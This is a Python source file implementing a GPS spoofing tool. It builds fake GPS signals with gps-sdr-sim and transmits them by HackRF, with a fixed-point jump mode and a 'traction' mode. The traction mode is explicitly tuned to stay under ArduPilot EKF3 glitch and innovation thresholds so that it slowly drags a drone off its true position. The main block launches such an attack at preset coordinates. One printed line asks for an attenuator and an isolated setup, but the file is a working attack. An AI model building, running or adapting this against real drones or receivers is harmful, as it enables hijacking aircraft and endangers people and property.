import xml.etree.ElementTree as ET
import math
import os
import sys
import subprocess
import time
import signal
import random

from utils.get_latest_brdc import fetch_latest_ephemeris, check_newst_brdc
from utils.tool import *
from hackrf_wrapper import HackRFCLI

class FakeGPS:
    def __init__(
        self,
        target_speed_mps=10.0,
        update_rate_hz=10.0,
        default_height=100.0,
        gps_sim_exe_path=os.path.join(
            get_project_root(), "third_party", "gps-sdr-sim", "gps-sdr-sim"
        ),
    ):
        """
        初始化 GPS 模擬器參數
        :param target_speed_mps: 移動速度 (m/s)
        :param update_rate_hz:   更新頻率 (Hz)
        :param default_height:   若 KML 無高度數據時的預設高度 (m)
        :param gps_sim_exe_path: gps-sdr-sim 執行檔路徑
        """
        self.target_speed_mps = target_speed_mps
        self.update_rate_hz = update_rate_hz
        self.default_height = default_height
        self.gps_sim_exe_path = self._resolve_executable_path(gps_sim_exe_path)

        self.hackrf = HackRFCLI()

    def _resolve_executable_path(self, exe_path: str) -> str:
        if os.path.exists(exe_path):
            return exe_path

        if os.name == "nt" and not exe_path.lower().endswith(".exe"):
            exe_path_with_ext = exe_path + ".exe"
            if os.path.exists(exe_path_with_ext):
                return exe_path_with_ext

        return exe_path

    def _get_dist_meters(self, lat1, lon1, lat2, lon2) -> float:
        """計算兩點間的距離 (Haversine formula)"""
        R = 6371000  # 地球半徑 (米)
        phi1, phi2 = math.radians(lat1), math.radians(lat2)
        dphi = math.radians(lat2 - lat1)
        dlambda = math.radians(lon2 - lon1)

        a = (
            math.sin(dphi / 2) ** 2
            + math.cos(phi1) * math.cos(phi2) * math.sin(dlambda / 2) ** 2
        )
        c = 2 * math.atan2(math.sqrt(a), math.sqrt(1 - a))
        return R * c

    def _parse_kml_coordinates(self, kml_file):
        """從 KML 提取座標"""
        if not os.path.exists(kml_file):
            raise FileNotFoundError(f"找不到檔案: {kml_file}")

        try:
            tree = ET.parse(kml_file)
            root = tree.getroot()

            coords_text = ""
            for elem in root.iter():
                if "coordinates" in elem.tag:
                    coords_text = elem.text
                    break

            if not coords_text:
                raise ValueError("在 KML 中找不到 <coordinates> 標籤")

            points = []
            # KML 格式: lon,lat,alt
            raw_points = coords_text.strip().split()
            for p in raw_points:
                parts = p.split(",")
                lon = float(parts[0])
                lat = float(parts[1])
                alt = float(parts[2]) if len(parts) > 2 else self.default_height
                points.append((lat, lon, alt))

            return points

        except Exception as e:
            print(f"[Error] 解析 KML 失敗: {e}")
            sys.exit(1)

    def _offset_lat_lon_m(self, lat, lon, d_north_m, d_east_m):
        """以公尺位移量更新座標 (近似)"""
        meters_per_deg_lat = 111320.0
        meters_per_deg_lon = 111320.0 * math.cos(math.radians(lat))
        if meters_per_deg_lon == 0:
            meters_per_deg_lon = 1e-6
        new_lat = lat + (d_north_m / meters_per_deg_lat)
        new_lon = lon + (d_east_m / meters_per_deg_lon)
        return new_lat, new_lon

    def _generate_drift_csv(
        self,
        csv_file,
        start_lat,
        start_lon,
        start_alt,
        duration_s,
        drift_rate_mps,
        mode="random_walk",
        seed=None,
        heading_deg=0.0,
        alt_jitter_m=0.0
    ) -> bool:
        """生成緩慢漂移的 CSV 軌跡"""
        dt = 1.0 / self.update_rate_hz
        steps = int(duration_s / dt)
        rng = random.Random(seed)

        lat = start_lat
        lon = start_lon
        base_alt = start_alt
        alt = base_alt
        heading = math.radians(heading_deg) if mode == "fixed_heading" else rng.uniform(0.0, 2.0 * math.pi)
        heading_sigma = math.radians(5.0)

        try:
            with open(csv_file, "w") as f:
                current_time = 0.0
                f.write(f"{current_time:.1f},{lat:.6f},{lon:.6f},{alt:.1f}\n")

                for _ in range(steps):
                    if mode == "random_walk":
                        heading += rng.gauss(0.0, heading_sigma)

                    distance = drift_rate_mps * dt
                    d_north = math.cos(heading) * distance
                    d_east = math.sin(heading) * distance
                    lat, lon = self._offset_lat_lon_m(lat, lon, d_north, d_east)

                    alt = base_alt
                    if alt_jitter_m > 0:
                        jitter = rng.gauss(0.0, alt_jitter_m / 3.0)
                        jitter = max(-alt_jitter_m, min(alt_jitter_m, jitter))
                        alt = base_alt + jitter

                    current_time += dt
                    f.write(f"{current_time:.1f},{lat:.6f},{lon:.6f},{alt:.1f}\n")

            self.total_duration = current_time
            print(f"[V] 漂移 CSV 生成完成: {csv_file} (時長: {self.total_duration:.1f}s)")
            return True
        except IOError as e:
            print(f"[Error] 寫入漂移 CSV 失敗: {e}")
            return False


    def kml_to_csv(self, kml_file, csv_file)-> bool:
        """KML 轉 CSV (含插值)"""
        print(f"[*] 正在解析 KML: {kml_file}")
        points = self._parse_kml_coordinates(kml_file)
        
        speed_mps = self.target_speed_mps
        dt = 1.0 / self.update_rate_hz
        current_time = 0.0
        
        # 用來記錄總時間，供生成 bin 使用
        self.total_duration = 0.0

        try:
            with open(csv_file, 'w') as f:
                # 起點
                start_lat, start_lon, start_alt = points[0]
                f.write(f"{current_time:.1f},{start_lat:.6f},{start_lon:.6f},{start_alt:.1f}\n")
                
                for i in range(len(points) - 1):
                    p1 = points[i]
                    p2 = points[i+1]
                    dist = self._get_dist_meters(p1[0], p1[1], p2[0], p2[1])
                    if dist == 0: continue

                    duration = dist / speed_mps
                    num_steps = int(duration / dt)
                    if num_steps == 0: continue

                    lon_step = (p2[1] - p1[1]) / num_steps
                    lat_step = (p2[0] - p1[0]) / num_steps
                    alt_step = (p2[2] - p1[2]) / num_steps

                    for s in range(1, num_steps + 1):
                        current_time += dt
                        new_lat = p1[0] + lat_step * s
                        new_lon = p1[1] + lon_step * s
                        new_alt = p1[2] + alt_step * s
                        f.write(f"{current_time:.1f},{new_lat:.6f},{new_lon:.6f},{new_alt:.1f}\n")
            
            self.total_duration = current_time
            print(f"[V] CSV 轉換完成: {csv_file} (時長: {self.total_duration:.1f}s)")
            return True
        except IOError as e:
            print(f"[Error] 寫入 CSV 失敗: {e}")
            return False

    def _generate_traction_csv(
        self,
        csv_file: str,
        start_lat: float,
        start_lon: float,
        start_alt: float,
        heading_deg: float,
        target_speed_mps: float,
        ramp_duration_s: float,
        total_duration_s: float,
    ) -> bool:
        """
        生成 EKF3 信任範圍內的牽引誘騙 CSV 軌跡。
        速度從 0 線性加速到 target_speed_mps，確保加速度遠低於 EK3_GLITCH_ACCEL (1.5 m/s²)。
        """
        dt = 1.0 / self.update_rate_hz
        steps = int(total_duration_s / dt)
        heading_rad = math.radians(heading_deg)

        accel = target_speed_mps / ramp_duration_s if ramp_duration_s > 0 else target_speed_mps / dt

        lat, lon, alt = start_lat, start_lon, start_alt
        current_speed = 0.0

        try:
            with open(csv_file, "w") as f:
                current_time = 0.0
                f.write(f"{current_time:.1f},{lat:.6f},{lon:.6f},{alt:.1f}\n")

                for _ in range(steps):
                    if current_speed < target_speed_mps:
                        current_speed = min(target_speed_mps, current_speed + accel * dt)

                    distance = current_speed * dt
                    d_north = math.cos(heading_rad) * distance
                    d_east = math.sin(heading_rad) * distance
                    lat, lon = self._offset_lat_lon_m(lat, lon, d_north, d_east)

                    current_time += dt
                    f.write(f"{current_time:.1f},{lat:.6f},{lon:.6f},{alt:.1f}\n")

            self.total_duration = current_time
            print(f"[V] 牽引 CSV 生成完成: {csv_file} (時長: {self.total_duration:.1f}s)")
            return True
        except IOError as e:
            print(f"[Error] 寫入牽引 CSV 失敗: {e}")
            return False

    # -------------------------------------------------------------------------
    # 公開誘騙介面
    # -------------------------------------------------------------------------

    def spoof_fixed_point(
        self,
        lat: float,
        lon: float,
        alt: float,
        duration_s: int = 60,
        output_bin: str = None,
        ephemeris_file: str = None,
        freq: int = 1575420000,
        sample_rate: int = 2600000,
        tx_gain: int = 47,
    ):
        """
        模式 1：固定點位 GPS 誘騙（瞬間跳躍誘騙）。
        直接發射指定座標的靜態 GPS 信號，無人機 EKF 若超出 Glitch 半徑 (25 m) 會先抵制，
        但最終會以 1 m/s 速率重新融合新位置。
        """
        if output_bin is None:
            output_bin = os.path.join(
                get_project_root(), "data", "fake_signal", "gps", "spoof_fixed.bin"
            )

        print(f"\n{'='*50}")
        print(f"[模式 1] 固定點位 GPS 誘騙（瞬間跳躍）")
        print(f"    目標座標 : {lat:.6f}, {lon:.6f}, Alt={alt:.1f}m")
        print(f"    發射時間 : {duration_s} 秒")
        print(f"{'='*50}")

        success = self.generate_bin(
            output_bin=output_bin,
            ephemeris_file_path=ephemeris_file,
            static_mode=True,
            manual_coords=(lat, lon, alt),
            drift_enabled=False,
            drift_duration_s=duration_s,
        )

        if success:
            actual_bin = output_bin.replace(".bin", "_static.bin")
            self.transmit_bin(actual_bin, freq=freq, sample_rate=sample_rate, tx_gain=tx_gain)

    def spoof_traction(
        self,
        current_lat: float,
        current_lon: float,
        current_alt: float,
        heading_deg: float = 0.0,
        target_speed_mps: float = 0.5,
        ramp_duration_s: float = 20.0,
        total_duration_s: float = 120.0,
        output_bin: str = None,
        ephemeris_file: str = None,
        freq: int = 1575420000,
        sample_rate: int = 2600000,
        tx_gain: int = 47,
    ):
        """
        模式 2：牽引式 GPS 誘騙（在 EKF3 信任範圍內緩慢移動）。

        EKF3 關鍵限制：
          - EK3_GLITCH_RAD    = 25 m   → 位置跳躍超過此值將觸發 Glitch 保護
          - EK3_POS_I_GATE    = 5σ     → 位置 innovation 門檻 ≈ 2.5 m（每次更新）
          - EK3_VEL_I_GATE    = 5σ     → 速度 innovation 門檻 ≈ 2.5 m/s
          - EK3_GLITCH_ACCEL  = 1.5 m/s² → Glitch 保護圓半徑成長率

        成功條件：
          1. 必須從無人機「真實 GPS 位置」出發，偏差 < 2.5 m
          2. 速度建議 ≤ 1 m/s（保守）或 ≤ 2 m/s（最大）
          3. 加速度必須 < 0.75 m/s²（EK3_GLITCH_ACCEL 的一半）
          4. ramp_duration_s ≥ target_speed_mps / 0.75

        :param current_lat:      無人機當前真實緯度
        :param current_lon:      無人機當前真實經度
        :param current_alt:      無人機當前真實高度 (m)
        :param heading_deg:      誘騙移動方向 (0=正北, 90=正東)
        :param target_speed_mps: 目標誘騙速度 (m/s)，建議 ≤ 1 m/s
        :param ramp_duration_s:  從 0 加速到目標速度所需時間 (s)
        :param total_duration_s: 誘騙總時長 (s)
        """
        EK3_VEL_GATE_MPS = 2.5   # 5σ × 0.5 m/s
        EK3_GLITCH_ACCEL = 1.5   # m/s²
        SAFE_ACCEL_RATIO = 0.5   # 使用閾值的一半作為安全加速度

        if target_speed_mps > EK3_VEL_GATE_MPS:
            print(
                f"[Warning] 速度 {target_speed_mps} m/s 超過 EKF3 速度創新門檻 "
                f"({EK3_VEL_GATE_MPS} m/s)，可能被 EKF3 拒絕！"
            )

        safe_accel = EK3_GLITCH_ACCEL * SAFE_ACCEL_RATIO
        min_ramp = target_speed_mps / safe_accel if safe_accel > 0 else 0
        if ramp_duration_s < min_ramp:
            print(
                f"[Warning] 加速時間 {ramp_duration_s:.1f}s 過短，"
                f"加速度 {target_speed_mps/ramp_duration_s:.2f} m/s² ≥ 安全上限 {safe_accel} m/s²"
            )
            print(f"          建議 ramp_duration_s ≥ {min_ramp:.1f} s")

        if output_bin is None:
            output_bin = os.path.join(
                get_project_root(), "data", "fake_signal", "gps", "spoof_traction.bin"
            )

        csv_file = os.path.splitext(output_bin)[0] + "_traction.csv"

        print(f"\n{'='*50}")
        print(f"[模式 2] 牽引式 GPS 誘騙")
        print(f"    起始座標（無人機真實位置）: {current_lat:.6f}, {current_lon:.6f}, Alt={current_alt:.1f}m")
        print(f"    誘騙方向 : {heading_deg}°（0=正北, 90=正東）")
        print(f"    目標速度 : {target_speed_mps} m/s")
        print(f"    加速時間 : {ramp_duration_s} s（加速度 {target_speed_mps/ramp_duration_s:.3f} m/s²）")
        print(f"    總時長   : {total_duration_s} s")
        print(f"    [EKF3]  速度門檻 ≤ {EK3_VEL_GATE_MPS} m/s | 安全加速度 ≤ {safe_accel} m/s²")
        print(f"{'='*50}")

        os.makedirs(os.path.dirname(output_bin), exist_ok=True)

        ok = self._generate_traction_csv(
            csv_file=csv_file,
            start_lat=current_lat,
            start_lon=current_lon,
            start_alt=current_alt,
            heading_deg=heading_deg,
            target_speed_mps=target_speed_mps,
            ramp_duration_s=ramp_duration_s,
            total_duration_s=total_duration_s,
        )
        if not ok:
            return

        success = self.generate_bin(
            output_bin=output_bin,
            ephemeris_file_path=ephemeris_file,
            static_mode=False,
            csv_file=csv_file,
        )

        if success:
            self.transmit_bin(output_bin, freq=freq, sample_rate=sample_rate, tx_gain=tx_gain)

    def generate_bin(
            self,
            output_bin,
            ephemeris_file_path=None,
            static_mode=False,
            manual_coords=None,
            csv_file=None,
            drift_enabled=False,
            drift_rate_mps=0.05,
            drift_mode="random_walk",
            drift_seed=None,
            drift_duration_s=None,
            drift_heading_deg=0.0,
            drift_alt_jitter_m=0.0
        ) -> bool:
        """
        呼叫 gps-sdr-sim 生成 .bin 檔案
        :param output_bin: 輸出 bin 檔案路徑
        :param ephemeris_file_path: 星曆檔案路徑
        :param static_mode: True 為靜態定點模式，False 為動態軌跡模式
        :param manual_coords: 靜態模式必需參數，格式 (lat, lon, alt)
        :param csv_file: 動態模式必需參數，CSV 路徑
        """

        # 1. 檢查並取得星曆
        if ephemeris_file_path is None or not check_newst_brdc():
            print("[*] 正在取得最新星曆檔案...")
            ephemeris_file_path = fetch_latest_ephemeris()
            if ephemeris_file_path is None:
                print(f"[Error] 無法取得最新星曆檔案")
                return False

        if not os.path.exists(self.gps_sim_exe_path):
            print(f"[Error] 找不到 gps-sdr-sim 執行檔: {self.gps_sim_exe_path}")
            return False

        if not os.path.exists(ephemeris_file_path):
            print(f"[Error] 找不到星曆檔案: {ephemeris_file_path}")
            return False

        print(f"[*] 開始生成 GPS 基頻信號 (這可能需要幾分鐘)...")
        print(f"    - 星曆: {ephemeris_file_path}")
        
        # 確保輸出目錄存在（必須在寫 drift CSV 之前）
        os.makedirs(os.path.dirname(output_bin), exist_ok=True)

        # 準備基礎指令
        cmd = [
            self.gps_sim_exe_path,
            "-e", ephemeris_file_path,
            "-s", "2600000",  # 設定採樣率為 2.6MHz
            "-b", "8",
            "-o", output_bin
        ]

        # 2. 根據模式配置參數
        if static_mode:
            # --- 靜態模式 (定點) ---
            if not manual_coords:
                print("[Error] 靜態模式 (static_mode=True) 必須提供 manual_coords 參數 (lat, lon, alt)")
                return False

            lat, lon, alt = manual_coords
            duration = drift_duration_s if drift_duration_s is not None else 60
            
            if drift_enabled:
                drift_csv = os.path.splitext(output_bin)[0] + "_drift.csv"
                print(f"    - 模式: 靜態定點 + 緩慢漂移")
                print(f"    - 起點座標: {lat}, {lon}, {alt}")
                print(f"    - 漂移速度: {drift_rate_mps} m/s")
                print(f"    - 漂移時間: {duration} 秒")

                ok = self._generate_drift_csv(
                    csv_file=drift_csv,
                    start_lat=lat,
                    start_lon=lon,
                    start_alt=alt,
                    duration_s=duration,
                    drift_rate_mps=drift_rate_mps,
                    mode=drift_mode,
                    seed=drift_seed,
                    heading_deg=drift_heading_deg,
                    alt_jitter_m=drift_alt_jitter_m
                )
                if not ok:
                    return False

                cmd.extend(["-u", drift_csv])
                output_bin = output_bin.replace(".bin", f"_drift.bin")
            else:
                print(f"    - 模式: 靜態定點 (Static)")
                print(f"    - 座標: {lat}, {lon}, {alt}")
                print(f"    - 時間: {duration} 秒")

                cmd.extend(["-l", f"{lat},{lon},{alt}"])
                cmd.extend(["-d", str(duration)])
                output_bin = output_bin.replace(".bin", f"_static.bin")
            
        else:
            # --- 動態模式 (軌跡) ---
            if not csv_file or not os.path.exists(csv_file):
                 print(f"[Error] 動態模式需要有效的 CSV 檔案路徑")
                 return False
            
            print(f"    - 模式: 動態軌跡 (Dynamic)")     
            print(f"    - 軌跡: {csv_file}")
            cmd.extend(["-u", csv_file])
        
        try:
            # 執行 gps-sdr-sim
            subprocess.run(cmd, check=True)
            print(f"[V] 信號生成成功: {output_bin}")
            return True
        except subprocess.CalledProcessError as e:
            print(f"[Error] gps-sdr-sim 執行失敗: {e}")
            return False

    def transmit_bin(self, bin_file, freq=1575420000, sample_rate=2600000, tx_gain=47):
        """呼叫 hackrf_transfer 發射信號"""
        if not os.path.exists(bin_file):
            print(f"[Error] 找不到 bin 檔案: {bin_file}")
            return

        print("\n" + "="*50)
        print(f"[*] 準備發射信號 (請確保已接上衰減器與隔離環境)")
        print(f"    - 頻率: {freq} Hz")
        print(f"    - 採樣率: {sample_rate} Hz")
        print(f"    - 增益: {tx_gain} (請從小開始調整)")
        print("    - 按下 Ctrl+C 可停止發射")
        print("="*50 + "\n")

        success = self.hackrf.start_tx(
            filename=bin_file,
            freq_hz=freq,
            sample_rate_hz=sample_rate,
            tx_gain=tx_gain,
            amp=False  # 預設關閉 Amp，使用有線連接建議為 False
        )

        if not success:
            print("[Error] 啟動發射失敗")
            return

        # 3. 進入等待迴圈，直到使用者按 Ctrl+C 或程式意外結束
        try:
            while True:
                # 檢查 HackRF 是否還在運行
                if not self.hackrf.is_running():
                    print("[!] HackRF 程序已停止")
                    break
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n[!] 使用者中斷發射 (Ctrl+C)。")
            self.hackrf.stop()
        except Exception as e:
            print(f"[Error] 發生未預期錯誤: {e}")
            self.hackrf.stop()


if __name__ == "__main__":

    simulator = FakeGPS(update_rate_hz=10.0, default_height=100.0)

    # ===========================================================
    # 模式 1：固定點位誘騙（瞬間跳躍）
    # ===========================================================
    # simulator.spoof_fixed_point(
    #     lat=23.14020741597821,
    #     lon=113.34317939905957,
    #     alt=10.0,
    #     duration_s=60,
    # )

    # ===========================================================
    # 模式 2：牽引式誘騙（EKF3 信任範圍內緩慢移動）
    #
    # 使用前請確認：
    #   - current_lat/lon/alt 填入無人機「當前真實 GPS 位置」
    #   - target_speed_mps ≤ 1.0 m/s（建議）或 ≤ 2.0 m/s（最大）
    #   - ramp_duration_s ≥ target_speed_mps / 0.75（EKF3 安全加速度限制）
    # ===========================================================
    simulator.spoof_traction(
        current_lat=23.14020741597821,    # 無人機當前真實緯度
        current_lon=113.34317939905957,   # 無人機當前真實經度
        current_alt=50.0,                 # 無人機當前真實高度 (m)
        heading_deg=90.0,                 # 誘騙方向：正東
        target_speed_mps=0.5,             # 目標速度：0.5 m/s（保守安全）
        ramp_duration_s=20.0,             # 加速時間：20s → 加速度 0.025 m/s²
        total_duration_s=180.0,           # 總誘騙時長：3 分鐘
    )


